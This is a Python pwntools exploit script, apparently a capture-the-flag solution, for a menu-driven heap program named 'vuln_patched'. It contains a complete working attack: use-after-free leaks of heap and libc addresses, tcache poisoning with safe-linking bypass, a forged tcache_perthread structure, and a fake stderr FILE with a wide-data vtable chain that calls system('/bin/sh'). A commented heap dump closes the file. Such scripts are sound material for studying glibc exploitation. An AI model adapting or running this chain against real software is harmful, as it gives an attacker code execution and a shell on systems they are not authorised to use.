from pwn import *
elf  = context.binary = ELF("./vuln_patched")
context.log_level = "Debug"

io = process()
# gdb.attach(io)
def malloc(index,size,data):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"index:",str(index))
    io.sendlineafter(b"memory?",str(size))
    io.sendlineafter(b"remember?",data)
    
def edit(index,data):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"rewrite?",str(index))    
    io.sendlineafter(b"memory:",data)

def view(index):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"recall?",str(index))   
   
def free(index):
    io.sendlineafter(b">",b"4")
    io.sendlineafter(b"erase?",str(index))   
    
    
malloc(0,0xf0,b"A")
malloc(1,0xf0,b"B")
malloc(2,0x100,b"C")
malloc(3,0xf0,b"D")    

free(0x0)
view(0x0)
heap_leak = unpack(io.recvn(0x6),"all")
heap_leak = (heap_leak>>8)<<12

free(0x1)
edit(0x1,pack((heap_leak+0x10)^heap_leak>>12))
malloc(4,0xf0,b"")
malloc(5,0xf0,b"")

fake_pthread = pack(0x2)+pack(0x0)+pack(0x0)+p32(0x0)+p8(0x0)+p8(0x0)+p8(0x7)

edit(5,(fake_pthread))
free(0x2)
view(0x2)
io.recvn(0x1)
libc_leak = unpack(io.recvn(0x6),"all")-0x203b20

log.critical(f"heap base:{hex(heap_leak)}")
log.critical(f"libc base:{hex(libc_leak)}")

free(0x3)
free(0x4)

stderr = pack((libc_leak+0x2044e0)^(heap_leak>>12))
edit(0x4,stderr)


log.critical(f"libc leaked address : {hex(libc_leak)}")

system_addr =libc_leak+0x58750

libc_base = libc_leak
log.info(f"Libc base is {hex(libc_base)}")
stderr_address = libc_base+0x2044e0

fake_wide_data = stderr_address-0x48
wide_vtable  = stderr_address


print(hex(wide_vtable))

lock = libc_base+0x205700
fake_stderr_vtable = libc_base+0x202228##jumps

chain = libc_base+0x2045c0

payload =pack(0x3b01010101010101)#0x0
payload+=b"/bin/sh\x00"#0x8

payload+=pack(0x0)#0x10

payload+=b"\x00"*(0x20-0x18)

payload +=pack(0x0)#0x20
payload+=pack(0x1)#0x28

payload+=p8(0x0)*(0x60-0x30)

payload+=pack(system_addr)#60
payload+=pack(chain)#68

payload+=p8(0x0)*(0x88-0x70)

payload+=pack(lock)#0x88
payload+=p8(0x0)*(0x98-0x90)#0x90
payload+=pack(wide_vtable-0x8)#0x98
payload+=p8(0x0)*(0xa0-0x90-0x10)

payload+=pack(fake_wide_data)#a0
payload+=pack(0x0)#a8
payload+=p8(0x0)*(0xd8-0xa8-0x8)

payload+=pack(fake_stderr_vtable)
print(len(payload))

print(f"fake wide data address = {hex(fake_wide_data)}")

print(f"fake_wide vtable address is {hex(wide_vtable)}")

malloc(0x6,0xf0,b"a")
malloc(0x7,0xf0,payload)
# edit(0x7,payload)
# io.sendlineafter(b">",b"5")
io.sendline(b"5")



         
    
    







io.interactive()
# 0x5c792dc98000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
# 0x5c792dc98010|+0x00010|+0x00010: 0x0000000000000002 0x0000000000000000 | ................ |
# 0x5c792dc98020|+0x00020|+0x00020: 0x0000000000000000 0x0001000000000000 | ................ |
# 0x5c792dc98030|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98040|+0x00040|+0x00040: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98050|+0x00050|+0x00050: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98060|+0x00060|+0x00060: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98070|+0x00070|+0x00070: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98080|+0x00080|+0x00080: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98090|+0x00090|+0x00090: 0x00005c792dc982c0 0x0000000000000000 | ...-y\.......... |
# 0x5c792dc980a0|+0x000a0|+0x000a0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980b0|+0x000b0|+0x000b0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980c0|+0x000c0|+0x000c0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980d0|+0x000d0|+0x000d0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980e0|+0x000e0|+0x000e0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980f0|+0x000f0|+0x000f0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98100|+0x00100|+0x00100: 0x0000000000000000 0x00005c792dc982e0 | ...........-y\.. |
# 0x5c792dc98110|+0x00110|+0x00110: 0x0000000000000000 0x0000000000000000 | ................ |
# * 23 lines, 0x170 bytes
